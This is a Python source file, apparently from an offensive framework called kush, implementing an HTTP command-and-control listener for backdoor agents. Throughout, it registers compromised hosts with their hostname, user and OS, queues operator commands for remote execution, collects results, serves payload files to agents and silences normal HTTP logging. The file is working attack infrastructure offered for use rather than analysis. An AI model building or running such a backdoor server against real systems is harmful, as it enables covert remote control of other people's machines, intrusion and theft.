# kush-framework/kush/protocols/http.py
"""
Enhanced HTTP protocol with proper backdoor support
"""

import http.server
import socketserver
import json
import urllib.parse
import threading
from typing import Optional
from colorama import Fore, Style

from kush.core.session import Session, SessionManager, SessionType

class HTTPHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        self.session_manager = kwargs.pop('session_manager')
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Handle GET requests - agent beaconing"""
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        
        if path == "/beacon":
            self._handle_beacon()
        elif path.startswith("/payload/"):
            self._serve_payload(path)
        else:
            self.send_error(404, "Endpoint not found")
    
    def do_POST(self):
        """Handle POST requests - command results and registration"""
        parsed_path = urllib.parse.urlparse(self.path)
        path = parsed_path.path
        
        if path == "/register":
            self._handle_register()
        elif path == "/result":
            self._handle_result()
        elif path == "/cmd":
            self._handle_command()
        else:
            self.send_error(404, "Endpoint not found")
    
    def _handle_beacon(self):
        """Handle agent beacon - check for pending commands"""
        client_ip = self.client_address[0]
        
        # Find or create session
        session = self._find_session_by_ip(client_ip)
        if not session:
            session = self.session_manager.create_session(
                (client_ip, 0), 
                SessionType.HTTP
            )
            print(f"{Fore.GREEN}[+] New HTTP session: {client_ip} - Session {session.session_id}{Style.RESET_ALL}")
        
        session.update_activity()
        
        # Check for pending commands
        pending_command = getattr(session, 'pending_command', None)
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        response = {
            "status": "ok",
            "session_id": session.session_id,
            "command": pending_command
        }
        
        # Clear pending command after sending
        if pending_command:
            session.pending_command = None
        
        self.wfile.write(json.dumps(response).encode())
    
    def _handle_register(self):
        """Handle agent registration with system info"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        client_ip = self.client_address[0]
        session = self._find_session_by_ip(client_ip)
        
        if not session:
            session = self.session_manager.create_session(
                (client_ip, 0), 
                SessionType.HTTP
            )
        
        # Update session with system information
        self.session_manager.update_session_info(session.session_id, data)
        session.update_activity()
        
        print(f"{Fore.CYAN}[*] HTTP session {session.session_id} registered: {data.get('hostname', 'unknown')} ({data.get('user', 'unknown')}@{data.get('os', 'unknown')}){Style.RESET_ALL}")
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        response = {
            "status": "registered",
            "session_id": session.session_id
        }
        self.wfile.write(json.dumps(response).encode())
    
    def _handle_result(self):
        """Handle command results from agent"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        session_id = data.get('session_id')
        result = data.get('result')
        
        if session_id and result:
            session = self.session_manager.get_session(session_id)
            if session:
                print(f"{Fore.CYAN}[*] Result from session {session_id}:{Style.RESET_ALL}")
                print(result)
        
        self.send_response(200)
        self.end_headers()
    
    def _handle_command(self):
        """Handle incoming commands (for two-way communication)"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data.decode())
        
        session_id = data.get('session_id')
        command = data.get('command')
        
        if session_id and command:
            session = self.session_manager.get_session(session_id)
            if session:
                # Store command for the agent to pick up
                session.pending_command = command
                print(f"{Fore.YELLOW}[*] Command queued for session {session_id}: {command}{Style.RESET_ALL}")
        
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        
        response = {"status": "command_queued"}
        self.wfile.write(json.dumps(response).encode())
    
    def _serve_payload(self, path: str):
        """Serve payload files to agents"""
        filename = path.split("/")[-1]
        payload_path = f"payloads/{filename}"
        
        try:
            with open(payload_path, 'rb') as f:
                content = f.read()
            
            self.send_response(200)
            self.send_header('Content-type', 'application/octet-stream')
            self.send_header('Content-Disposition', f'attachment; filename="{filename}"')
            self.end_headers()
            self.wfile.write(content)
            
            print(f"{Fore.GREEN}[+] Served payload: {filename}{Style.RESET_ALL}")
            
        except FileNotFoundError:
            self.send_error(404, "File not found")
    
    def _find_session_by_ip(self, ip: str) -> Optional[Session]:
        """Find session by IP address"""
        for session in self.session_manager.sessions.values():
            if session.address[0] == ip:
                return session
        return None
    
    def log_message(self, format, *args):
        """Override to suppress normal HTTP logs"""
        pass

class HTTPListener:
    def __init__(self, host: str, port: int, session_manager: SessionManager):
        self.host = host
        self.port = port
        self.session_manager = session_manager
        self.server: Optional[socketserver.TCPServer] = None
        self.running = False
    
    def start(self):
        """Start HTTP listener"""
        try:
            handler = lambda *args: HTTPHandler(*args, session_manager=self.session_manager)
            self.server = socketserver.TCPServer((self.host, self.port), handler)
            self.running = True
            
            print(f"{Fore.GREEN}[+] HTTP listener started on {self.host}:{self.port}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] HTTP endpoints:{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*]   GET  /beacon    - Agent check-in{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*]   POST /register  - Agent registration{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*]   POST /result    - Command results{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*]   POST /cmd       - Send commands{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*]   GET  /payload/* - Serve payloads{Style.RESET_ALL}")
            
            self.server.serve_forever()
            
        except Exception as e:
            print(f"{Fore.RED}[-] HTTP listener error: {e}{Style.RESET_ALL}")
        finally:
            self.stop()
    
    def stop(self):
        """Stop HTTP listener"""
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()